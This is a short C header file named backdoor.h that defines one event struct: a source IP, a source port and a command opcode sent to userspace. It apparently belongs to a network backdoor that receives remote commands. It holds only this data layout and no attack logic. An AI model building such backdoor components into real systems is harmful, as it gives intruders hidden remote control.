#ifndef __BACKDOOR_H
#define __BACKDOOR_H

/**
 * @brief Event structure sent to userspace
 * 
 */
struct event_t {
    u32 src_ip;
    u16 src_port;
    u32 command_opcode;
};

#endif /* __BACKDOOR_H */
